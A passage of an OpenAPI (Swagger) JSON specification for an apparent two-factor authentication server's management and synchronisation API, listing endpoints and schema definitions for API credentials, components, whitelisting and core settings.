          }
        ],
        "responses": {
          "default": {}
        }
      }
    },
    "/manage/v2/UpdateRadiusClient": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Updates RADIUS client definition.",
        "description": "All settings have to be specified. Use GetRadiusClientById to obtain them.",
        "operationId": "Manage.UpdateRadiusClient",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_UpdateRadiusClient"
            }
          }
        ],
        "responses": {
          "default": {}
        }
      }
    },
    "/manage/v2/ValidateCommand": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Validates the provided command.",
        "description": "Returns information about the parsed command.",
        "operationId": "Manage.ValidateCommand",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_ValidateCommand"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/CommandInfo"
            }
          }
        }
      }
    },
    "/Ping": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Check if the service is available.",
        "description": "Always returns true.",
        "operationId": "Ping",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_Ping"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "boolean"
            }
          }
        }
      }
    },
    "/sync/ExternalRealmSyncDeleteUsers": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Find and delete obsolete users in a synchronized realm from external source (i.e. an synchronization agent).",
        "description": "Currently, automatic synchronization with Active Directory and LDAP servers is supported.<br /><br /><b>Parameters of response (see Model for additional descriptions):</b>\n<b>Processed</b>: Information about synchronization result.",
        "operationId": "Sync.ExternalRealmSyncDeleteUsers",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_ExternalRealmSyncDeleteUsers"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/SyncRealmResult"
            }
          }
        }
      }
    },
    "/sync/ExternalRealmSyncOUTree": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Updates OU tree in a synchronized realm from external source (i.e. an synchronization agent).",
        "description": "Currently, automatic synchronization with Active Directory and LDAP servers is supported.<br /><br /><b>Parameters of response (see Model for additional descriptions):</b>\n<b>Processed</b>: Information about synchronization result.",
        "operationId": "Sync.ExternalRealmSyncOUTree",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_ExternalRealmSyncOUTree"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/SyncRealmResult"
            }
          }
        }
      }
    },
    "/sync/ExternalRealmSyncUpdateUsers": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Update users in a synchronized realm from external source (i.e. an synchronization agent).",
        "description": "Currently, automatic synchronization with Active Directory and LDAP servers is supported.<br /><br /><b>Parameters of response (see Model for additional descriptions):</b>\n<b>Processed</b>: Information about synchronization result.",
        "operationId": "Sync.ExternalRealmSyncUpdateUsers",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_ExternalRealmSyncUpdateUsers"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/SyncRealmResult"
            }
          }
        }
      }
    },
    "/sync/Ping": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Check if the service is available.",
        "description": "Always returns true.",
        "operationId": "Sync.Ping",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_Ping"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "boolean"
            }
          }
        }
      }
    },
    "/ValidateEmail": {
      "get": {
        "tags": [
          "ESA"
        ],
        "summary": "Validate notification email.",
        "description": "Validates an email address with guid sent in the email body.",
        "operationId": "ValidateNotificationEmail",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "guid",
            "in": "query",
            "required": true,
            "type": "string"
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "type": "string",
              "format": "stream"
            }
          }
        }
      }
    },
    "/VerifyInvitation": {
      "post": {
        "tags": [
          "ESA"
        ],
        "summary": "Uses invitation and creates access for the component.",
        "description": "Registers a new invited computer. Increases invitation usages count. The returned credentials can be used the same way as API credentials created manually. Remove the authorized computer to deactivate the credentials.",
        "operationId": "VerifyInvitation",
        "consumes": [
          "application/json"
        ],
        "produces": [
          "application/json"
        ],
        "parameters": [
          {
            "name": "request object",
            "in": "body",
            "required": true,
            "schema": {
              "$ref": "#/definitions/Request_VerifyInvitation"
            }
          }
        ],
        "responses": {
          "default": {
            "schema": {
              "$ref": "#/definitions/AuthenticationServerAccess"
            }
          }
        }
      }
    }
  },
  "definitions": {
    "ApiConsumerSettingFilter": {
      "properties": {
        "Name": {
          "description": "Filtering by name.",
          "type": "string"
        },
        "Account": {
          "description": "Filtering by account",
          "type": "string"
        },
        "Invitation": {
          "description": "Filtering by invitation name",
          "type": "string"
        },
        "SelfInvitationOnly": {
          "description": "Filtering by self invitation",
          "type": "boolean",
          "x-nullable": true
        },
        "ApiSettings": {
          "description": "Filtering by API settings",
          "type": "integer",
          "format": "enum",
          "x-nullable": true,
          "enum": [
            1,
            2,
            4,
            8
          ]
        },
        "ColumnId": {
          "description": "Sorting column id",
          "type": "string"
        },
        "Order": {
          "description": "Ascending or descending order",
          "type": "string"
        },
        "FirstRowIndex": {
          "description": "Index of first item",
          "type": "integer",
          "format": "int32"
        },
        "LastRowIndex": {
          "description": "Index of last item",
          "type": "integer",
          "format": "int32",
          "x-nullable": true
        }
      },
      "type": "object",
      "format": "ApiConsumerSettingFilter"
    },
    "ApiConsumerSettingsPublic": {
      "properties": {
        "ApiUsername": {
          "description": "API credentials - user name (is unique).",
          "type": "string"
        },
        "ApiPassword": {
          "description": "API credentials - password.",
          "type": "string"
        },
        "Name": {
          "description": "Display name of API credentials.",
          "type": "string"
        },
        "Type": {
          "description": "Possible values: 0 - manually created, 1 - Web console admin login, 2 - credentials for an invited computer.",
          "type": "integer",
          "format": "enum",
          "enum": [
            0,
            1,
            2
          ]
        },
        "EnabledForAuthApi": {
          "description": "If these credentials can be used to call the authentication API (/auth).",
          "type": "boolean"
        },
        "EnabledForManagementApi": {
          "description": "If these credentials can be used to call the management API (/manage).",
          "type": "boolean"
        },
        "EnabledForSynchronizationApi": {
          "description": "If these credentials can be used to call the synchronization API (/sync).",
          "type": "boolean"
        },
        "CoreComputer": {
          "description": "If these credentials were automatically created to invite the computer where Authentication Server is installed.",
          "type": "boolean"
        },
        "InvitationName": {
          "description": "Contains name of invitation used to create these credentials (only for credentials for an invited computer).",
          "type": "string"
        },
        "CompanyGuid": {
          "description": "Company Guid.",
          "type": "string",
          "format": "guid"
        }
      },
      "type": "object",
      "format": "ApiConsumerSettingsPublic"
    },
    "ApiConsumerSettingsResponse": {
      "properties": {
        "FilteredItems": {
          "description": "Filtered API credentials",
          "type": "array",
          "items": {
            "$ref": "#/definitions/ApiConsumerSettingsPublic"
          }
        },
        "TotalCount": {
          "description": "Count of all items on server",
          "type": "integer",
          "format": "int64"
        },
        "FirstRowIndex": {
          "description": "Index of first returned item from filtered result",
          "type": "integer",
          "format": "int32"
        },
        "LastRowIndex": {
          "description": "Index of last returned item from filtered result",
          "type": "integer",
          "format": "int32",
          "x-nullable": true
        },
        "FilteredCount": {
          "description": "Count of filter items",
          "type": "integer",
          "format": "int64"
        }
      },
      "type": "object",
      "format": "ApiConsumerSettingsResponse"
    },
    "ApiConsumerSettingsUpdate": {
      "properties": {
        "Name": {
          "description": "Display name of API credentials.",
          "type": "string"
        },
        "EnabledForAuthApi": {
          "description": "If these credentials can be used to call the authentication API (/auth).",
          "type": "boolean"
        },
        "EnabledForManagementApi": {
          "description": "If these credentials can be used to call the management API (/manage).",
          "type": "boolean"
        },
        "EnabledForSynchronizationApi": {
          "description": "If these credentials can be used to call the synchronization API (/sync).",
          "type": "boolean"
        }
      },
      "type": "object",
      "format": "ApiConsumerSettingsUpdate"
    },
    "ApiCredentials": {
      "properties": {
        "Username": {
          "description": "User name.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "ApiCredentials"
    },
    "AuthenticateAndSyncResult": {
      "properties": {
        "AuthenticationResult": {
          "description": "Result of current authentication.",
          "$ref": "#/definitions/AuthResult"
        },
        "OfflineOtpHashes": {
          "description": "Data to store in offline cache.",
          "$ref": "#/definitions/OfflineOtpHashes"
        },
        "MasterRecoveryKey": {
          "description": "Pre-generated master recovery key to be stored in offline cache.",
          "$ref": "#/definitions/Mrk"
        },
        "Fido": {
          "description": "FIDO data for offline cache.",
          "$ref": "#/definitions/OfflineFido"
        }
      },
      "type": "object",
      "format": "AuthenticateAndSyncResult"
    },
    "AuthenticationServerAccess": {
      "properties": {
        "Valid": {
          "description": "If the invitation code was valid.",
          "type": "boolean"
        },
        "UserName": {
          "description": "Created API username.",
          "type": "string"
        },
        "Password": {
          "description": "Created API password.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "AuthenticationServerAccess"
    },
    "AuthenticationTypes": {
      "properties": {
        "Sms": {
          "description": "Authentication type: SMS.",
          "type": "boolean"
        },
        "SoftTokens": {
          "description": "Authentication type: mobile application OTP.",
          "type": "boolean"
        },
        "SoftTokensPush": {
          "description": "Authentication type: mobile application Push.",
          "type": "boolean"
        },
        "HardTokens": {
          "description": "Authentication type: hard token.",
          "type": "boolean"
        },
        "FIDO": {
          "description": "Authentication type: FIDO.",
          "type": "boolean"
        }
      },
      "type": "object",
      "format": "AuthenticationTypes"
    },
    "AuthenticationTypes_Optional": {
      "properties": {
        "Sms": {
          "description": "Authentication type: SMS.",
          "type": "boolean",
          "x-nullable": true
        },
        "SoftTokens": {
          "description": "Authentication type: mobile application OTP.",
          "type": "boolean",
          "x-nullable": true
        },
        "SoftTokensPush": {
          "description": "Authentication type: mobile application Push.",
          "type": "boolean",
          "x-nullable": true
        },
        "HardTokens": {
          "description": "Authentication type: hard token.",
          "type": "boolean",
          "x-nullable": true
        },
        "FIDO": {
          "description": "Authentication type: FIDO.",
          "type": "boolean",
          "x-nullable": true
        }
      },
      "type": "object",
      "format": "AuthenticationTypes_Optional"
    },
    "AuthResult": {
      "properties": {
        "Authenticated": {
          "description": "If the user is authenticated (should be let in).",
          "type": "boolean"
        },
        "MsChapV2Keys": {
          "description": "Only for RADIUS authentication.",
          "type": "array",
          "items": {
            "type": "string",
            "format": "byte"
          }
        },
        "MsChapV2Success": {
          "description": "Only for RADIUS authentication.",
          "type": "string"
        },
        "NewRadiusChallengeRequestsPairingKey": {
          "description": "Only for RADIUS authentication. Send it to second step of the authentication.",
          "type": "string"
        },
        "RadiusChallengeMessage": {
          "description": "Message to show to the user as the prompt for the second step of the authentication.",
          "type": "string"
        },
        "SelfEnrollmentKey": {
          "description": "Key to provide to SelfEnroll.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "AuthResult"
    },
    "CommandInfo": {
      "properties": {
        "Error": {
          "description": "Command validation error (or null if the command is correct).",
          "type": "string"
        },
        "Attributes": {
          "description": "Attributes contained in the command.",
          "type": "array",
          "items": {
            "type": "string"
          }
        },
        "Hash": {
          "description": "Command hash to be saved on the Authentication Server computer to allow the command to be executed.",
          "type": "string"
        },
        "AuthorizationFileName": {
          "description": "Name of the expected file with hash.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "CommandInfo"
    },
    "ComponentInfo": {
      "properties": {
        "Key": {
          "description": "Unique identifier.",
          "type": "string"
        },
        "Name": {
          "description": "Display name.",
          "type": "string"
        },
        "CompanyGuid": {
          "description": "Company Guid.",
          "type": "string",
          "format": "guid"
        }
      },
      "type": "object",
      "format": "ComponentInfo"
    },
    "ComponentInfo_Key": {
      "properties": {
        "Key": {
          "description": "Unique identifier.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "ComponentInfo_Key"
    },
    "ComponentInfoWithSettings": {
      "properties": {
        "Info": {
          "description": "Information about the component instance.",
          "$ref": "#/definitions/ComponentInfo"
        },
        "Settings": {
          "description": "Settings for the component instance.",
          "$ref": "#/definitions/ComponentSettings"
        },
        "Statistics": {
          "description": "Statistics about the component instance.",
          "$ref": "#/definitions/ComponentStatistics"
        }
      },
      "type": "object",
      "format": "ComponentInfoWithSettings"
    },
    "ComponentInfoWithSettingsFilter": {
      "properties": {
        "Name": {
          "description": "Filtering by name",
          "type": "string"
        },
        "ComponentEnabled": {
          "description": "Filtering by component enabled",
          "type": "boolean",
          "x-nullable": true
        },
        "ComponentAllowNon2Fa": {
          "description": "Filtering by component allow also non 2fa users",
          "type": "boolean",
          "x-nullable": true
        },
        "Fido": {
          "description": "Filtering by Fido origin",
          "type": "string"
        },
        "Solution": {
          "description": "Filtering by solution",
          "type": "string"
        },
        "ComponentOutOfDate": {
          "description": "Filtering by out of date",
          "type": "boolean",
          "x-nullable": true
        },
        "ComponentType": {
          "description": "Filtering by component type",
          "type": "string"
        },
        "ColumnId": {
          "description": "Sorting column id",
          "type": "string"
        },
        "Order": {
          "description": "Ascending or descending order",
          "type": "string"
        },
        "FirstRowIndex": {
          "description": "Index of first item",
          "type": "integer",
          "format": "int32"
        },
        "LastRowIndex": {
          "description": "Index of last item",
          "type": "integer",
          "format": "int32",
          "x-nullable": true
        }
      },
      "type": "object",
      "format": "ComponentInfoWithSettingsFilter"
    },
    "ComponentInfoWithSettingsResponse": {
      "properties": {
        "FilteredItems": {
          "description": "Filtered Components info",
          "type": "array",
          "items": {
            "$ref": "#/definitions/ComponentInfoWithSettings"
          }
        },
        "TotalCount": {
          "description": "Count of all items on server",
          "type": "integer",
          "format": "int64"
        },
        "FirstRowIndex": {
          "description": "Index of first returned item from filtered result",
          "type": "integer",
          "format": "int32"
        },
        "LastRowIndex": {
          "description": "Index of last returned item from filtered result",
          "type": "integer",
          "format": "int32",
          "x-nullable": true
        },
        "FilteredCount": {
          "description": "Count of filter items",
          "type": "integer",
          "format": "int64"
        }
      },
      "type": "object",
      "format": "ComponentInfoWithSettingsResponse"
    },
    "ComponentKey": {
      "properties": {
        "Key": {
          "description": "Component key.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "ComponentKey"
    },
    "ComponentRegistration": {
      "properties": {
        "Settings": {
          "description": "Settings for this component instance.",
          "$ref": "#/definitions/ComponentSettings"
        },
        "RadiusClients": {
          "description": "Applicable only for RADIUS components.",
          "type": "array",
          "items": {
            "$ref": "#/definitions/RadiusClientSettings"
          }
        },
        "IdentityProviderConfigurations": {
          "description": "Applicable only for Identity Provider Connector components.",
          "type": "array",
          "items": {
            "$ref": "#/definitions/IdentityProviderConfiguration"
          }
        },
        "IisSettings": {
          "description": "Applicable only for components from ESA IISFilter.",
          "$ref": "#/definitions/IisAdditionalSettings"
        },
        "Version": {
          "description": "Provide this to next possible RegisterComponent call to download settings only if they were changed on the Authentication Server in the meanwhile.",
          "type": "integer",
          "format": "int64",
          "x-nullable": true
        }
      },
      "type": "object",
      "format": "ComponentRegistration"
    },
    "ComponentSettings": {
      "properties": {
        "Enabled": {
          "description": "If the component is enabled. Can be used e.g. to not load/integrate the component if it is disabled.",
          "type": "boolean",
          "x-nullable": true
        },
        "AllowNon2FaUsers": {
          "description": "If users without 2FA should be able to log in.",
          "type": "boolean",
          "x-nullable": true
        },
        "SiteUrl": {
          "description": "URL where this component is available e.g. for accessing by users from the browser.",
          "type": "string"
        },
        "FidoOrigin": {
          "description": "Origin for FIDO authenticator.",
          "type": "string"
        },
        "SolutionKey": {
          "description": "To group components to be handled as parts of the same solution.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "ComponentSettings"
    },
    "ComponentState": {
      "properties": {
        "Version": {
          "description": "Component version. Used for statistics.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "ComponentState"
    },
    "ComponentStatistics": {
      "properties": {
        "AllowNon2FaUsers": {
          "description": "Whether some configuration of the component allows non-2FA users.",
          "type": "boolean",
          "x-nullable": true
        },
        "Version": {
          "description": "Component version.",
          "type": "string"
        },
        "ApplicationVersion": {
          "description": "Application version.",
          "type": "string"
        },
        "OutOfDate": {
          "description": "Whether the component is out of date.",
          "type": "boolean"
        },
        "IpcSpMaxCount": {
          "description": "Max count of Service Providers in Identity Provider Connector",
          "type": "integer",
          "format": "int32",
          "x-nullable": true
        }
      },
      "type": "object",
      "format": "ComponentStatistics"
    },
    "ComponentTypeInfo": {
      "properties": {
        "Key": {
          "description": "Unique identifier.",
          "type": "string"
        },
        "Name": {
          "description": "Display name.",
          "type": "string"
        },
        "Description_ForIpWhitelisting": {
          "description": "Additional description for IP whitelisting settings.",
          "type": "string"
        },
        "SupportsWhitelist": {
          "description": "Show in whitelist settings and allow users whitelisting.",
          "type": "boolean"
        },
        "IsIisFilter": {
          "description": "If it belongs to the webs handled by ESA IISFilter.",
          "type": "boolean"
        },
        "ShownInComponentLists": {
          "description": "If it should be shown in the lists of components in Web console.",
          "type": "boolean"
        },
        "ShownInStatistics": {
          "description": "If it should be shown in statistics on dashboards.",
          "type": "boolean"
        },
        "HasMoreComponents": {
          "description": "If more components than 1 exist. Used only for UI behavior in e.g. Web console.",
          "type": "boolean"
        },
        "HasPreLoadedMrk": {
          "description": "If the components pre-load MRKs for possible offline logins.",
          "type": "boolean"
        },
        "HasComponentSettings": {
          "description": "If it has the basic settings (Enabled, Allow non-2FA users).",
          "type": "boolean"
        },
        "HasLocalLoginSettings": {
          "description": "If it has the local login settings.",
          "type": "boolean"
        },
        "CanBeRegistered": {
          "description": "If new components of this type can be registered.",
          "type": "boolean"
        },
        "CanBeUnregistered": {
          "description": "If the registered components can be unregistered.",
          "type": "boolean"
        },
        "IsSystemComponent": {
          "description": "If it is a system (ESA internal) component.",
          "type": "boolean"
        },
        "SupportsFIDO": {
          "description": "If the components supports FIDO.",
          "type": "boolean"
        },
        "FIDO_UseLocalOrigin": {
          "description": "If the components use automatically configured local FIDO origin.",
          "type": "boolean"
        },
        "HasSolutions": {
          "description": "Whether components can be grouped to be handled as parts of the same solution.",
          "type": "boolean"
        },
        "SolutionTypeKey": {
          "description": "If set, components of this component type (and of other component types with the same value of this property) can be handled as parts of the same solution.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "ComponentTypeInfo"
    },
    "ComponentTypeInfo_KeyOnly": {
      "properties": {
        "Key": {
          "description": "Unique identifier.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "ComponentTypeInfo_KeyOnly"
    },
    "ComponentTypeInfoWithSettings": {
      "properties": {
        "Info": {
          "description": "Information about the component type. Cannot be changed.",
          "$ref": "#/definitions/ComponentTypeInfo"
        },
        "Settings": {
          "description": "Settings for the component type.",
          "$ref": "#/definitions/ComponentTypeSettings"
        },
        "Count": {
          "description": "Count of components of this type.",
          "type": "integer",
          "format": "int32",
          "x-nullable": true
        }
      },
      "type": "object",
      "format": "ComponentTypeInfoWithSettings"
    },
    "ComponentTypeSettings": {
      "properties": {
        "WhitelistEnabled": {
          "description": "If global whitelisting (the same IP list for all component types) is enabled when logging in using components of this type.",
          "type": "boolean",
          "x-nullable": true
        },
        "PerComponentTypeWhitelistEnabled": {
          "description": "If whitelisting per component type (separate IP list for each component type) is enabled when logging in using components of this type.",
          "type": "boolean",
          "x-nullable": true
        },
        "PerComponentTypeWhitelistIpList": {
          "description": "List of whitelisted IP addresses for whitelisting per component type. Can be delimited by newline, ; or ,. Can be IPv4 or IPv6. Subnets (10.2.1.0/24) and ranges (10.1.1.20-10.1.1.90) can be used.",
          "type": "string"
        },
        "LocalLoginSettings": {
          "description": "Contains settings for local logins, if it is a local logins component type.",
          "$ref": "#/definitions/LocalLoginSettings"
        }
      },
      "type": "object",
      "format": "ComponentTypeSettings"
    },
    "ComponentTypeStatistics": {
      "properties": {
        "Count": {
          "description": "Total count of components.",
          "type": "integer",
          "format": "int32"
        },
        "OutOfDateCount": {
          "description": "Count of out of date components.",
          "type": "integer",
          "format": "int32"
        },
        "AllowNon2FaUsersCount": {
          "description": "Count of components which allow non-2FA users.",
          "type": "integer",
          "format": "int32"
        },
        "OldestVersion": {
          "description": "Oldest found component version.",
          "type": "string"
        },
        "OldestAppVersion": {
          "description": "Oldest found component app version.",
          "type": "string"
        },
        "NewestAppVersion": {
          "description": "Newest found component app version.",
          "type": "string"
        },
        "SomeOutOfDate": {
          "description": "List of some components which are out of date (if there is a lot of out of date components, only some of them are returned).",
          "type": "array",
          "items": {
            "type": "string"
          }
        },
        "SomeAllowNon2FaUsers": {
          "description": "List of some components which allow non-2FA users (if there is a lot of such components, only some of them are returned).",
          "type": "array",
          "items": {
            "type": "string"
          }
        },
        "IpcSpMaxCount": {
          "description": "Max count of Service Providers in Identity Provider Connector",
          "type": "integer",
          "format": "int32",
          "x-nullable": true
        }
      },
      "type": "object",
      "format": "ComponentTypeStatistics"
    },
    "ComponentTypeWithSettings": {
      "properties": {
        "Info": {
          "description": "Information about the component type instance.",
          "$ref": "#/definitions/ComponentTypeInfo_KeyOnly"
        },
        "Settings": {
          "description": "Settings for the component type.",
          "$ref": "#/definitions/ComponentTypeSettings"
        }
      },
      "type": "object",
      "format": "ComponentTypeWithSettings"
    },
    "ComponentTypeWithStatistics": {
      "properties": {
        "Info": {
          "description": "Information about the component type.",
          "$ref": "#/definitions/ComponentTypeInfo"
        },
        "Statistics": {
          "description": "Current statistics for the component type.",
          "$ref": "#/definitions/ComponentTypeStatistics"
        }
      },
      "type": "object",
      "format": "ComponentTypeWithStatistics"
    },
    "ComponentWithSettingsAndCompany": {
      "properties": {
        "Info": {
          "description": "Information about the component instance.",
          "$ref": "#/definitions/ComponentInfo_Key"
        },
        "Settings": {
          "description": "Settings for the component instance.",
          "$ref": "#/definitions/ComponentSettings"
        }
      },
      "type": "object",
      "format": "ComponentWithSettingsAndCompany"
    },
    "CoreInfo": {
      "properties": {
        "LangID": {
          "description": "Authentication Server language ID.",
          "type": "integer",
          "format": "int32"
        },
        "LangCode": {
          "description": "Authentication Server language code.",
          "type": "string"
        },
        "ProductType": {
          "description": "Authentication Server standardized product type string.",
          "type": "string"
        },
        "ProductVersion": {
          "description": "Authentication Server version - full version - major.minor.build.language.",
          "type": "string"
        },
        "ProductVersionShort": {
          "description": "Authentication Server version - short version - major.minor.",
          "type": "string"
        },
        "ProductVersionMajor": {
          "description": "Authentication Server version - just major.",
          "type": "string"
        },
        "UrlInfo_User": {
          "description": "URL to offer the user in various situations related to Users consumption.",
          "$ref": "#/definitions/UrlInfo"
        },
        "UrlInfo_OTPSMS": {
          "description": "URL to offer the user in various situations related to OTP SMS consumption.",
          "$ref": "#/definitions/UrlInfo"
        },
        "Platform": {
          "description": "Authentication Server platform (32-bit or 64-bit).",
          "type": "string"
        },
        "OsBuild": {
          "description": "Authentication Server operating system build number.",
          "type": "string"
        },
        "OsType": {
          "description": "Authentication Server operating system type (server, ...).",
          "type": "string"
        }
      },
      "type": "object",
      "format": "CoreInfo"
    },
    "CoreServerInfo": {
      "properties": {
        "Addresses": {
          "description": "List of possible internal addresses to connect to. The addresses are obtained from the server's HTTPS certificate.",
          "type": "array",
          "items": {
            "type": "string"
          }
        },
        "CertificateThumbprint": {
          "description": "Server's HTTPS certificate thumbprint.",
          "type": "string"
        },
        "CertificateValidity_NotAfter": {
          "description": "Server's HTTPS certificate expiration time.",
          "type": "string",
          "x-nullable": true,
          "example": "/Date(1517472000)/",
          "pattern": "/Date([0-9]+)/"
        },
        "ExternalAddress": {
          "description": "External address to connect to.",
          "type": "string"
        },
        "ExternalCertificateThumbprint": {
          "description": "Proxy's HTTPS certificate thumbprint.",
          "type": "string"
        },
        "ExternalCertificateValidity_NotAfter": {
          "description": "Proxy's HTTPS certificate expiration time.",
          "type": "string",
          "x-nullable": true,
          "example": "/Date(1517472000)/",
          "pattern": "/Date([0-9]+)/"
        },
        "NoIncludeInternal": {
          "description": "Do not include internal addresses in the invitation.",
          "type": "boolean"
        }
      },
      "type": "object",
      "format": "CoreServerInfo"
    },
    "CoreSettings": {
      "properties": {
        "MobileAppTokenName": {
          "description": "This name will be visible to the user in mobile application as the name of the token from this Authentication Server.",
          "type": "string"
        },
        "MobileNumberAttribute": {
          "description": "Active Directory attribute to be used to obtain user's mobile number (ldapDisplayName of the attribute). Used: when accessing users from default domain in AD mode, in realm synchronization with AD/LDAP.",
          "type": "string"
        },
        "EmailAttribute": {
          "description": "Active Directory attribute to be used to obtain user's email (ldapDisplayName of the attribute). Used: when accessing users from default domain in AD mode, in realm synchronization with AD/LDAP.",
          "type": "string"
        },
        "DisplaynameAttribute": {
          "description": "Active Directory attribute to be used to obtain user's display name (ldapDisplayName of the attribute). Used: when accessing users from default domain in AD mode, in realm synchronization with AD/LDAP.",
          "type": "string"
        },
        "MobileAppPinEnforced": {
          "description": "If mobile application should be configured to force the user to set up application PIN.",
          "type": "boolean",
          "x-nullable": true
        },
        "MobileAppBiometricsAllowed": {
          "description": "If mobile application should be configured to use biometrics in addition to PIN.",
          "type": "boolean",
          "x-nullable": true
        },
        "MobileAppIpConfirmationEnforced": {
          "description": "If mobile application should be configured to force the user to additionally confirm each Push approval from an unknown IP address.",
          "type": "boolean",
          "x-nullable": true
        },
        "WhitelistEnabled": {
          "description": "If global whitelisting (allowing logins without 2FA from specific IP addresses) should be enabled. If this is enabled, additional needed settings are: global whitelisting for specific component types has to be enabled (SetComponentTypeSettings), WhitelistIpList has to be set.",
          "type": "boolean",
          "x-nullable": true
        },
        "WhitelistIpList": {
          "description": "List of whitelisted IP addresses for global whitelisting. Can be delimited by newline, ; or ,. Can be IPv4 or IPv6. Subnets (10.2.1.0/24) and ranges (10.1.1.20-10.1.1.90) can be used.",
          "type": "string"
        },
        "PerComponentTypeWhitelistEnabled": {
          "description": "If whitelisting (allowing logins without 2FA from specific IP addresses) per component type should be enabled. If this is enabled, additional needed settings are: whitelisting per component type for specific component types has to be enabled and IP list per component type for specific component types has to be set (SetComponentTypeSettings).",
          "type": "boolean",
          "x-nullable": true
        },
        "Delivery": {
          "description": "Options for message delivery. If saving using SetCoreSettings and this member is specified, all its members have to be filled in correctly (the whole structure will be saved). Use GetCoreSettings to get current values.",
          "$ref": "#/definitions/DeliverySettings"
        },
        "ApiEnabled": {
          "description": "If API credentials are globally enabled. This does not influence availability of Web console or API credentials for invited computers.",
          "type": "boolean",
          "x-nullable": true
        },
        "HardTokensEnabled": {
          "description": "If logging in using hard tokens is globally enabled. If disabled, users with hard tokens only will be able to log in only using MRK.",
          "type": "boolean",
          "x-nullable": true
        },
        "SelfEnrollmentEnabled": {
          "description": "If users can fill in missing data for authentication types enabled by the admin.",
          "type": "boolean",
          "x-nullable": true
        },
        "AutoRegistrationEnabled": {
          "description": "If auto registration is enabled. If this is enabled, unknown users will be automatically added to ESA on first login.",
          "type": "boolean",
          "x-nullable": true
        },
        "DefaultUserConfig": {
          "description": "Default configuration for new users. If saving using SetCoreSettings and this member is specified, all its members have to be filled in correctly (the whole structure will be saved). Use GetCoreSettings to get current values.",
          "$ref": "#/definitions/DefaultUserConfig"
        },
        "Reports": {
          "description": "Reports settings.",
          "$ref": "#/definitions/ReportsSettings"
        },
        "FIDO": {
          "description": "FIDO settings.",
          "$ref": "#/definitions/FIDOSettings"
        },
        "Notifications": {
          "description": "Notifications settings.",
          "$ref": "#/definitions/NotificationSettings"
        },
        "EmailValidation": {
          "description": "Notifications email validation.",
          "$ref": "#/definitions/NotificationValidation"
        },
        "Smtp": {
          "description": "SMTP server configuration. Used for sending notifications. Only on-prem.",
          "$ref": "#/definitions/SMTPSettings"
        },
        "ManagementAccess": {
          "description": "Restriction to Authentication Server management. Only on-prem.",
          "$ref": "#/definitions/ManagementAccessSettings"
        }
      },
      "type": "object",
      "format": "CoreSettings"
    },
    "CoreSettingsWithCompany": {
      "properties": {
        "Settings": {
          "description": "Global settings.",
          "$ref": "#/definitions/CoreSettings"
        }
      },
      "type": "object",
      "format": "CoreSettingsWithCompany"
    },
    "DefaultUserConfig": {
      "properties": {
        "AuthenticationTypes": {
          "description": "Enabled authentication types. If saving using SetCoreSettings and this member is specified, all its members have to be filled in correctly (the whole structure will be saved). Use GetCoreSettings to get current values.",
          "$ref": "#/definitions/AuthenticationTypes"
        },
        "SoftTokenType": {
          "description": "Type of mobile application token. Possible values: 1 - HOTP, 2 - TOTP.",
          "type": "integer",
          "format": "enum",
          "enum": [
            1,
            2
          ]
        }
      },
      "type": "object",
      "format": "DefaultUserConfig"
    },
    "DeliverySettings": {
      "properties": {
        "Provisioning": {
          "description": "Type of delivery for provisioning messages. Possible values: 0 - default SMS delivery by ESA servers, 1 - custom delivery (specify ProvisioningCustomApp), 2 - by email, 3 - None",
          "type": "integer",
          "format": "enum",
          "x-nullable": true,
          "enum": [
            0,
            1,
            2,
            3
          ]
        },
        "SendingOTP": {
          "description": "Type of delivery for OTP messages. Possible values: 0 - default SMS delivery by ESA servers, 1 - custom delivery (specify OtpCustomApp), 2 - by email.",
          "type": "integer",
          "format": "enum",
          "x-nullable": true,
          "enum": [
            0,
            1,
            2,
            3
          ]
        },
        "ProvisioningCustomApp": {
